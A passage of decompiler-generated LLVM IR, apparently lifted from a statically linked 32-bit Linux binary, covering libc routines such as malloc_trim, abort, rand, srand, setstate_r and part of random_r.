dec_label_pc_80549ed:                             ; preds = %entry, %dec_label_pc_80549dc
  %.0 = phi i32 [ undef, %entry ], [ %v2_80549e5, %dec_label_pc_80549dc ]
  store i32 %v0_805485c, i32* @ebx, align 4
  store i32 %v0_805485b, i32* @esi, align 4
  store i32 %v0_805485a, i32* @edi, align 4
  store i32 %v0_8054859, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_80549bc, { 1, 0 }
  uselistorder i32 %v0_805494e, { 1, 0 }
  uselistorder i32 %v1_805491c, { 1, 0 }
  uselistorder i32 %v2_8054915, { 1, 0 }
  uselistorder i32 %v1_805490a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8054919, { 1, 0 }
  uselistorder i32 %v1_805489d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8054895, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805488d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 undef, { 1, 0 }
  uselistorder i32* bitcast (i8* @global_var_8065800.958 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8065834.961 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_806582c.959, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_80549ed, { 1, 0 }
  uselistorder label %dec_label_pc_80549dc, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8054998, { 1, 0 }
  uselistorder label %dec_label_pc_8054977, { 1, 0 }
  uselistorder label %dec_label_pc_8054942, { 1, 0 }
  uselistorder label %dec_label_pc_805493a, { 1, 0 }
  uselistorder label %dec_label_pc_8054906, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80549f5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8054a02 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8065800.958 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8065800.958 to i32), i32* @edx, align 4
  %v0_8054a0f = load i32, i32* @ebx, align 4
  store i32 %v0_8054a0f, i32* @eax, align 4
  store i32 %v0_80549f5, i32* @ebx, align 4
  %v0_8054a12 = call i32 @__malloc_trim()
  ret i32 %v0_8054a12

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8065800.958 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8065800.958, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8054a24 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f3a8.978 to i32))
  %v12_8054a2e = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a33

dec_label_pc_8054a33:                             ; preds = %dec_label_pc_8054a33.dec_label_pc_8054a33_crit_edge, %entry
  %v0_8054a33 = phi i32 [ %v12_8054a2e, %entry ], [ %v0_8054a33.pre, %dec_label_pc_8054a33.dec_label_pc_8054a33_crit_edge ]
  %v1_8054a3e19 = phi i32 [ 31, %entry ], [ %v1_8054a3e, %dec_label_pc_8054a33.dec_label_pc_8054a33_crit_edge ]
  %v2_8054a33 = mul i32 %v1_8054a3e19, 4
  %v3_8054a33 = add i32 %v2_8054a33, 152
  %v4_8054a33 = add i32 %v3_8054a33, %v0_8054a33
  %v5_8054a33 = inttoptr i32 %v4_8054a33 to i32*
  store i32 0, i32* %v5_8054a33, align 4
  %v0_8054a3e.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8054a3e = add i32 %v0_8054a3e.pre, -1
  %v9_8054a3e = icmp slt i32 %v1_8054a3e, 0
  store i32 %v1_8054a3e, i32* %eax.global-to-local, align 4
  %v1_8054a3f = icmp eq i1 %v9_8054a3e, false
  br i1 %v1_8054a3f, label %dec_label_pc_8054a33.dec_label_pc_8054a33_crit_edge, label %dec_label_pc_8054a41

dec_label_pc_8054a33.dec_label_pc_8054a33_crit_edge: ; preds = %dec_label_pc_8054a33
  %v0_8054a33.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054a33

dec_label_pc_8054a41:                             ; preds = %dec_label_pc_8054a33
  %v0_8054a41 = load i32, i32* @ebx, align 4
  %v2_8054a45 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8054a45, i32* @ebx, align 4
  %v4_8054a4d = call i32 @__sigaddset(i32 %v2_8054a45, i32 6, i32 %v0_8054a41, i32 %v0_8054a41)
  store i32 %v4_8054a4d, i32* %eax.global-to-local, align 4
  %v1_8054a55 = icmp eq i32 %v4_8054a4d, 0
  %v1_8054a57 = icmp eq i1 %v1_8054a55, false
  br i1 %v1_8054a57, label %dec_label_pc_8054a67, label %dec_label_pc_8054a59

dec_label_pc_8054a59:                             ; preds = %dec_label_pc_8054a41
  %v3_8054a5f = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8054a5f = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8054a5f, i32 0)
  store i32 %v4_8054a5f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a67

dec_label_pc_8054a67:                             ; preds = %dec_label_pc_8054a41, %dec_label_pc_8054a59
  %v2_8054a9f4 = phi i32 [ %v4_8054a4d, %dec_label_pc_8054a41 ], [ %v4_8054a5f, %dec_label_pc_8054a59 ]
  %v0_8054a67 = load i8, i8* @global_var_8065720.979, align 32
  %v1_8054a67 = icmp eq i8 %v0_8054a67, 0
  %v1_8054a6e = icmp eq i1 %v1_8054a67, false
  br i1 %v1_8054a6e, label %dec_label_pc_8054a9f, label %dec_label_pc_8054a70

dec_label_pc_8054a70:                             ; preds = %dec_label_pc_8054a67
  store i8 1, i8* @global_var_8065720.979, align 32
  br label %dec_label_pc_8054a77

dec_label_pc_8054a77:                             ; preds = %dec_label_pc_8054ade, %dec_label_pc_8054a70
  %v1_8054a7f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f3a8.978 to i32))
  store i32 %v1_8054a7f, i32* %eax.global-to-local, align 4
  %v1_8054a8b = call i32 @__raise(i32 6)
  store i32 %v1_8054a8b, i32* %eax.global-to-local, align 4
  %v1_8054a97 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f3a8.978 to i32))
  store i32 %v1_8054a97, i32* %eax.global-to-local, align 4
  %v0_8054a9f.pre = load i8, i8* @global_var_8065720.979, align 32
  br label %dec_label_pc_8054a9f

dec_label_pc_8054a9f:                             ; preds = %dec_label_pc_8054a67, %dec_label_pc_8054a77
  %v2_8054a9f = phi i32 [ %v2_8054a9f4, %dec_label_pc_8054a67 ], [ %v1_8054a97, %dec_label_pc_8054a77 ]
  %v0_8054a9f = phi i8 [ %v0_8054a67, %dec_label_pc_8054a67 ], [ %v0_8054a9f.pre, %dec_label_pc_8054a77 ]
  %v1_8054a9f = zext i8 %v0_8054a9f to i32
  %v3_8054a9f = and i32 %v2_8054a9f, -256
  %v4_8054a9f = or i32 %v1_8054a9f, %v3_8054a9f
  store i32 %v4_8054a9f, i32* %eax.global-to-local, align 4
  %v10_8054aa4 = icmp eq i8 %v0_8054a9f, 1
  %v1_8054aa6 = icmp eq i1 %v10_8054aa4, false
  br i1 %v1_8054aa6, label %dec_label_pc_8054b00, label %dec_label_pc_8054aa8

dec_label_pc_8054aa8:                             ; preds = %dec_label_pc_8054a9f
  %v2_8054ab0 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8054ab0, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8065720.979, align 32
  %v3_8054abc = bitcast i32* %stack_var_-272 to i8*
  %v4_8054abc = call i32 @__GI_memset(i8* %v3_8054abc, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054ad3

dec_label_pc_8054ad3:                             ; preds = %dec_label_pc_8054ad3.dec_label_pc_8054ad3_crit_edge, %dec_label_pc_8054aa8
  %v0_8054ad3 = phi i32 [ %v12_8054a2e, %dec_label_pc_8054aa8 ], [ %v0_8054ad3.pre, %dec_label_pc_8054ad3.dec_label_pc_8054ad3_crit_edge ]
  %v1_8054adb18 = phi i32 [ 31, %dec_label_pc_8054aa8 ], [ %v1_8054adb, %dec_label_pc_8054ad3.dec_label_pc_8054ad3_crit_edge ]
  %v2_8054ad3 = mul i32 %v1_8054adb18, 4
  %v3_8054ad3 = add i32 %v2_8054ad3, 16
  %v4_8054ad3 = add i32 %v3_8054ad3, %v0_8054ad3
  %v5_8054ad3 = inttoptr i32 %v4_8054ad3 to i32*
  store i32 -1, i32* %v5_8054ad3, align 4
  %v0_8054adb.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8054adb = add i32 %v0_8054adb.pre, -1
  %v9_8054adb = icmp slt i32 %v1_8054adb, 0
  store i32 %v1_8054adb, i32* %eax.global-to-local, align 4
  %v1_8054adc = icmp eq i1 %v9_8054adb, false
  br i1 %v1_8054adc, label %dec_label_pc_8054ad3.dec_label_pc_8054ad3_crit_edge, label %dec_label_pc_8054ade

dec_label_pc_8054ad3.dec_label_pc_8054ad3_crit_edge: ; preds = %dec_label_pc_8054ad3
  %v0_8054ad3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054ad3

dec_label_pc_8054ade:                             ; preds = %dec_label_pc_8054ad3
  store i32 %v2_8054ab0, i32* %eax.global-to-local, align 4
  %v4_8054af3 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8054af3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a77

dec_label_pc_8054b00:                             ; preds = %dec_label_pc_8054a9f
  %v10_8054b00 = icmp eq i8 %v0_8054a9f, 2
  %v1_8054b02 = icmp eq i1 %v10_8054b00, false
  br i1 %v1_8054b02, label %dec_label_pc_8054b0c, label %dec_label_pc_8054b04

dec_label_pc_8054b04:                             ; preds = %dec_label_pc_8054b00
  store i8 3, i8* @global_var_8065720.979, align 32
  br label %dec_label_pc_8054b0c

dec_label_pc_8054b0c:                             ; preds = %dec_label_pc_8054b00, %dec_label_pc_8054b04
  %v0_8054b0c = phi i8 [ %v0_8054a9f, %dec_label_pc_8054b00 ], [ 3, %dec_label_pc_8054b04 ]
  %v9_8054b0c = icmp eq i8 %v0_8054b0c, 3
  %v1_8054b13 = icmp eq i1 %v9_8054b0c, false
  br i1 %v1_8054b13, label %dec_label_pc_8054b26, label %dec_label_pc_8054b15

dec_label_pc_8054b15:                             ; preds = %dec_label_pc_8054b0c
  store i8 4, i8* @global_var_8065720.979, align 32
  %v1_8054b21 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8054b26:                             ; preds = %dec_label_pc_8054b0c, %dec_label_pc_8054b26
  br label %dec_label_pc_8054b26

; uselistorder directives
  uselistorder i32 %v1_8054adb, { 2, 1, 0 }
  uselistorder i8 %v0_8054a9f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8054a3e, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8 3, { 0, 2, 6, 4, 5, 3, 1 }
  uselistorder i8* @global_var_8065720.979, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8054b26, { 1, 0 }
  uselistorder label %dec_label_pc_8054b0c, { 1, 0 }
  uselistorder label %dec_label_pc_8054a9f, { 1, 0 }
  uselistorder label %dec_label_pc_8054a67, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8054b2c = call i32 @random()
  ret i32 %v0_8054b2c

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 11, 0, 6, 5, 2, 3, 7, 8, 9, 10, 12, 4, 1 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054b34 = load i32, i32* @ebx, align 4
  store i32 %v0_8054b34, i32* %stack_var_-4, align 4
  %v2_8054b42 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054b42, i32* @ebx, align 4
  %v2_8054b47 = call i32 @__pthread_return_void(i32 %v2_8054b42, i32 134567199)
  %v1_8054b53 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f3c0.980 to i32))
  %v2_8054b5a = ptrtoint i32* %stack_var_-8 to i32
  %v3_8054b64 = call i32 @__GI_random_r(i32* nonnull @global_var_805f3d8, i32 %v2_8054b5a)
  store i32 ptrtoint (i32* @global_var_805f3d8 to i32), i32* @eax, align 4
  %v2_8054b6e = call i32 @__pthread_return_void(i32 %v2_8054b42, i32 1)
  %v3_8054b73 = load i32, i32* %stack_var_-8, align 4
  %v2_8054b7a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054b7a, i32* @ebx, align 4
  ret i32 %v3_8054b73
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8054b8d = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054b8d, i32* @eax, align 4
  %v2_8054b92 = call i32 @__pthread_return_void(i32 %v2_8054b8d, i32 134567199)
  %v1_8054b9e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f3c0.980 to i32))
  %v0_8054ba3 = load i32, i32* bitcast (i32** @global_var_805f3e0.983 to i32*), align 32
  store i32 %v0_8054ba3, i32* @ebx, align 4
  %v3_8054bb4 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805f3d8)
  %v2_8054bbc = icmp slt i32 %v3_8054bb4, 0
  br i1 %v2_8054bbc, label %dec_label_pc_8054bc3, label %dec_label_pc_8054bc0

dec_label_pc_8054bc0:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805f3dc.984 to i32), i32* @esi, align 4
  br label %dec_label_pc_8054bc3

dec_label_pc_8054bc3:                             ; preds = %entry, %dec_label_pc_8054bc0
  store i32 %v2_8054b8d, i32* @eax, align 4
  %v2_8054bcc = call i32 @__pthread_return_void(i32 %v2_8054b8d, i32 1)
  %v0_8054bd4 = load i32, i32* @esi, align 4
  ret i32 %v0_8054bd4

; uselistorder directives
  uselistorder label %dec_label_pc_8054bc3, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8054be8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054be8, i32* @ebx, align 4
  %v2_8054bed = call i32 @__pthread_return_void(i32 %v2_8054be8, i32 134567199)
  %v1_8054bf9 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f3c0.980 to i32))
  store i32 ptrtoint (i32** @global_var_805f3dc.984 to i32), i32* @esi, align 4
  %v4_8054c18 = inttoptr i32 %arg2 to i32*
  %v5_8054c18 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8054c18, i32 %arg3, i32 ptrtoint (i32* @global_var_805f3d8 to i32))
  store i32 %v5_8054c18, i32* @eax, align 4
  %v2_8054c23 = call i32 @__pthread_return_void(i32 %v2_8054be8, i32 1)
  %v0_8054c2b = load i32, i32* @esi, align 4
  ret i32 %v0_8054c2b
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054c30 = load i32, i32* @ebx, align 4
  store i32 %v0_8054c30, i32* %stack_var_-4, align 4
  %v2_8054c3e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8054c3e, i32* @ebx, align 4
  %v2_8054c43 = call i32 @__pthread_return_void(i32 %v2_8054c3e, i32 134567199)
  %v1_8054c4f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f3c0.980 to i32))
  %v3_8054c5f = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_805f3d8)
  store i32 ptrtoint (i32* @global_var_805f3d8 to i32), i32* @eax, align 4
  %v2_8054c69 = call i32 @__pthread_return_void(i32 %v2_8054c3e, i32 1)
  %v2_8054c71 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8054c71, i32* @ebx, align 4
  ret i32 %v2_8054c69

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_805f3d8 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_805f3d8, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_8054c77 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_8054c83 = add i32 %tmp3, 12
  %v2_8054c83 = inttoptr i32 %v1_8054c83 to i32*
  %v3_8054c83 = load i32, i32* %v2_8054c83, align 4
  store i32 %v3_8054c83, i32* %ecx.global-to-local, align 4
  %v1_8054c86 = add i32 %arg1, 4
  store i32 %v1_8054c86, i32* %esi.global-to-local, align 4
  %v1_8054c89 = add i32 %tmp3, 8
  %v2_8054c89 = inttoptr i32 %v1_8054c89 to i32*
  %v3_8054c89 = load i32, i32* %v2_8054c89, align 4
  %v1_8054c8c = icmp eq i32 %v3_8054c83, 0
  %v1_8054c8e = icmp eq i1 %v1_8054c8c, false
  br i1 %v1_8054c8e, label %dec_label_pc_8054c99, label %dec_label_pc_8054c90

dec_label_pc_8054c90:                             ; preds = %entry
  %v1_8054c90 = add i32 %v3_8054c89, -4
  %v2_8054c90 = inttoptr i32 %v1_8054c90 to i32*
  store i32 0, i32* %v2_8054c90, align 4
  br label %dec_label_pc_8054ca9

dec_label_pc_8054c99:                             ; preds = %entry
  %v1_8054c99 = add i32 %tmp3, 4
  %v2_8054c99 = inttoptr i32 %v1_8054c99 to i32*
  %v3_8054c99 = load i32, i32* %v2_8054c99, align 4
  %v2_8054c9c = sub i32 %v3_8054c99, %v3_8054c89
  %v2_8054c9e = sdiv i32 %v2_8054c9c, 4
  %v3_8054ca1 = mul i32 %v2_8054c9e, 5
  %v2_8054ca4 = add i32 %v3_8054ca1, %v3_8054c83
  store i32 %v2_8054ca4, i32* %eax.global-to-local, align 4
  %v2_8054ca6 = add i32 %v3_8054c89, -4
  %v3_8054ca6 = inttoptr i32 %v2_8054ca6 to i32*
  store i32 %v2_8054ca4, i32* %v3_8054ca6, align 4
  br label %dec_label_pc_8054ca9

dec_label_pc_8054ca9:                             ; preds = %dec_label_pc_8054c90, %dec_label_pc_8054c99
  %v0_8054ca9 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054ca9 = add i32 %v0_8054ca9, -4
  %v2_8054ca9 = inttoptr i32 %v1_8054ca9 to i32*
  %v3_8054ca9 = load i32, i32* %v2_8054ca9, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8054cb1 = ashr i32 %v3_8054ca9, 31
  %v2_8054cb2 = zext i32 %v3_8054ca9 to i64
  %v4_8054cb2 = zext i32 %v1_8054cb1 to i64
  %v5_8054cb2 = mul nuw i64 %v4_8054cb2, 4294967296
  %v6_8054cb2 = or i64 %v5_8054cb2, %v2_8054cb2
  %v8_8054cb2 = sdiv i64 %v6_8054cb2, 5
  %v9_8054cb2 = trunc i64 %v8_8054cb2 to i32
  store i32 %v9_8054cb2, i32* %eax.global-to-local, align 4
  %v10_8054cb2 = srem i64 %v6_8054cb2, 5
  %v11_8054cb2 = trunc i64 %v10_8054cb2 to i32
  %v6_8054cb7 = icmp ugt i32 %v11_8054cb2, 4
  br i1 %v6_8054cb7, label %dec_label_pc_8054cf7, label %dec_label_pc_8054cb9

dec_label_pc_8054cb9:                             ; preds = %dec_label_pc_8054ca9
  %v1_8054cb9 = mul i32 %v11_8054cb2, 4
  %v2_8054cb9 = add i32 %v1_8054cb9, ptrtoint (i32* @global_var_805e7f4.985 to i32)
  %v3_8054cb9 = inttoptr i32 %v2_8054cb9 to i32*
  %v4_8054cb9 = load i32, i32* %v3_8054cb9, align 4
  store i32 %v4_8054cb9, i32* %ecx.global-to-local, align 4
  %v1_8054cc0 = icmp eq i32 %v11_8054cb2, 0
  %v2_8054cc2 = add i32 %v1_8054cb9, ptrtoint (i32* @global_var_805e7e0.986 to i32)
  %v3_8054cc2 = inttoptr i32 %v2_8054cc2 to i32*
  %v4_8054cc2 = load i32, i32* %v3_8054cc2, align 4
  store i32 %v4_8054cc2, i32* %ebp.global-to-local, align 4
  %v1_8054cc9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054cc9 = add i32 %v1_8054cc9, 12
  %v3_8054cc9 = inttoptr i32 %v2_8054cc9 to i32*
  store i32 %v11_8054cb2, i32* %v3_8054cc9, align 4
  %v0_8054ccc = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054ccc = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054ccc = add i32 %v1_8054ccc, 16
  %v3_8054ccc = inttoptr i32 %v2_8054ccc to i32*
  store i32 %v0_8054ccc, i32* %v3_8054ccc, align 4
  %v0_8054ccf = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054ccf = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054ccf = add i32 %v1_8054ccf, 20
  %v3_8054ccf = inttoptr i32 %v2_8054ccf to i32*
  store i32 %v0_8054ccf, i32* %v3_8054ccf, align 4
  br i1 %v1_8054cc0, label %dec_label_pc_8054cea, label %dec_label_pc_8054cd4

dec_label_pc_8054cd4:                             ; preds = %dec_label_pc_8054cb9
  %v0_8054cd4 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054cd4 = add i32 %v0_8054cd4, -4
  %v2_8054cd4 = inttoptr i32 %v1_8054cd4 to i32*
  %v3_8054cd4 = load i32, i32* %v2_8054cd4, align 4
  %v1_8054cd7 = ashr i32 %v3_8054cd4, 31
  %v0_8054cd8 = load i32, i32* %edi.global-to-local, align 4
  %v2_8054cd8 = zext i32 %v3_8054cd4 to i64
  %v4_8054cd8 = zext i32 %v1_8054cd7 to i64
  %v5_8054cd8 = mul nuw i64 %v4_8054cd8, 4294967296
  %v6_8054cd8 = or i64 %v5_8054cd8, %v2_8054cd8
  %v7_8054cd8 = zext i32 %v0_8054cd8 to i64
  %v8_8054cd8 = sdiv i64 %v6_8054cd8, %v7_8054cd8
  %v9_8054cd8 = trunc i64 %v8_8054cd8 to i32
  %v2_8054cda = mul i32 %v9_8054cd8, 4
  %v3_8054cda = add i32 %v2_8054cda, %v0_8054cd4
  %v1_8054cdd = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054cdd = add i32 %v1_8054cdd, %v9_8054cd8
  store i32 %v2_8054cdd, i32* %eax.global-to-local, align 4
  %v1_8054cdf = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054cdf = add i32 %v1_8054cdf, 4
  %v3_8054cdf = inttoptr i32 %v2_8054cdf to i32*
  store i32 %v3_8054cda, i32* %v3_8054cdf, align 4
  %v0_8054ce2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054ce2 = ashr i32 %v0_8054ce2, 31
  %v0_8054ce3 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054ce3 = zext i32 %v0_8054ce2 to i64
  %v4_8054ce3 = zext i32 %v1_8054ce2 to i64
  %v5_8054ce3 = mul nuw i64 %v4_8054ce3, 4294967296
  %v6_8054ce3 = or i64 %v5_8054ce3, %v2_8054ce3
  %v7_8054ce3 = zext i32 %v0_8054ce3 to i64
  %v8_8054ce3 = sdiv i64 %v6_8054ce3, %v7_8054ce3
  %v9_8054ce3 = trunc i64 %v8_8054ce3 to i32
  store i32 %v9_8054ce3, i32* %eax.global-to-local, align 4
  %v10_8054ce3 = srem i64 %v6_8054ce3, %v7_8054ce3
  %v11_8054ce3 = trunc i64 %v10_8054ce3 to i32
  %v0_8054ce5 = load i32, i32* %esi.global-to-local, align 4
  %v2_8054ce5 = mul i32 %v11_8054ce3, 4
  %v3_8054ce5 = add i32 %v2_8054ce5, %v0_8054ce5
  %v1_8054ce8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054ce8 = inttoptr i32 %v1_8054ce8 to i32*
  store i32 %v3_8054ce5, i32* %v2_8054ce8, align 4
  br label %dec_label_pc_8054cea

dec_label_pc_8054cea:                             ; preds = %dec_label_pc_8054cb9, %dec_label_pc_8054cd4
  %v0_8054cea = load i32, i32* %esi.global-to-local, align 4
  %v1_8054cea = load i32, i32* %ecx.global-to-local, align 4
  %v2_8054cea = mul i32 %v1_8054cea, 4
  %v3_8054cea = add i32 %v2_8054cea, %v0_8054cea
  %v1_8054ced = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054ced = add i32 %v1_8054ced, 24
  %v3_8054ced = inttoptr i32 %v2_8054ced to i32*
  store i32 %v3_8054cea, i32* %v3_8054ced, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8054cf2 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054cf2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054cf2 = add i32 %v1_8054cf2, 8
  %v3_8054cf2 = inttoptr i32 %v2_8054cf2 to i32*
  store i32 %v0_8054cf2, i32* %v3_8054cf2, align 4
  %v0_8054d0c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054d05

dec_label_pc_8054cf7:                             ; preds = %dec_label_pc_8054ca9
  %v1_8054cf7 = call i32 @__errno_location(i32 %v0_8054c77)
  %v1_8054cfc = inttoptr i32 %v1_8054cf7 to i32*
  store i32 22, i32* %v1_8054cfc, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054d05

dec_label_pc_8054d05:                             ; preds = %dec_label_pc_8054cea, %dec_label_pc_8054cf7
  %v0_8054d0c = phi i32 [ %v0_8054d0c.pre, %dec_label_pc_8054cea ], [ -1, %dec_label_pc_8054cf7 ]
  store i32 %v0_8054c77, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8054d0c

; uselistorder directives
  uselistorder i32 %v11_8054cb2, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054d05, { 1, 0 }
  uselistorder label %dec_label_pc_8054cea, { 1, 0 }
  uselistorder label %dec_label_pc_8054ca9, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8054d10 = load i32, i32* @ebx, align 4
  store i32 %v0_8054d10, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8054d19 = add i32 %tmp3, 12
  %v2_8054d19 = inttoptr i32 %v1_8054d19 to i32*
  %v3_8054d19 = load i32, i32* %v2_8054d19, align 4
  %v4_8054d19 = icmp eq i32 %v3_8054d19, 0
  %v1_8054d1d = add i32 %tmp3, 8
  %v2_8054d1d = inttoptr i32 %v1_8054d1d to i32*
  %v3_8054d1d = load i32, i32* %v2_8054d1d, align 4
  store i32 %v3_8054d1d, i32* %esi.global-to-local, align 4
  %v1_8054d20 = icmp eq i1 %v4_8054d19, false
  br i1 %v1_8054d20, label %dec_label_pc_8054d39, label %dec_label_pc_8054d22

dec_label_pc_8054d22:                             ; preds = %entry
  %v2_8054d22 = inttoptr i32 %v3_8054d1d to i32*
  %v3_8054d22 = load i32, i32* %v2_8054d22, align 4
  %v5_8054d22 = mul i32 %v3_8054d22, 1103515245
  %v1_8054d28 = add i32 %v5_8054d22, 12345
  %v1_8054d2d = urem i32 %v1_8054d28, -2147483648
  store i32 %v1_8054d2d, i32* %eax.global-to-local, align 4
  store i32 %v1_8054d2d, i32* %v2_8054d22, align 4
  %v0_8054d34 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054d34 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054d34 = inttoptr i32 %v1_8054d34 to i32*
  store i32 %v0_8054d34, i32* %v2_8054d34, align 4
  br label %dec_label_pc_8054d64

dec_label_pc_8054d39:                             ; preds = %entry
  %v1_8054d39 = add i32 %tmp3, 4
  %v2_8054d39 = inttoptr i32 %v1_8054d39 to i32*
